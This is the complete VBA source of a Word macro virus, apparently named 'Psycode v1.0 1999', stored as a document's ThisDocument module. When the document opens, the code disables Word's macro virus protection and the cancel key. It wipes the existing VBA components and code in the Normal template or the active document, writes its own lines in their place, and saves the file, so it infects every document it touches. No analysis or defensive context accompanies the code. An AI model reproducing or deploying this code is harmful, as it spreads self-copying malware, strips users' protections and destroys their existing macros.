   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub document_open()
   On Error Resume Next
   Options.VirusProtection = 0: EnableCancelKey = 0
   Set maci = MacroContainer.VBProject.vbComponents.Item(1)
   Set macic = maci.codemodule
   ns$ = Left(macic.lines(1, 1), 21)
   Set inf = NormalTemplate: nsi$ = ns$ + "close"
   If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$ + "open"
   Set infc = inf.VBProject.vbComponents
   Set infi = infc.Item(1)
   Set infic = infi.codemodule
   For mx = 2 To infc.Count: infc.Remove infc.Item(2): Next mx
   infic.deletelines 1, infic.countoflines
   infic.addfromstring macic.lines(1, 17) 'count of lines!
   infic.replaceline 1, nsi$
   If Left(ActiveDocument.Name, 8) <> Mid$(macic.lines(1, 1), 13, 8) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   End Sub 'Psycode v1.0 1999
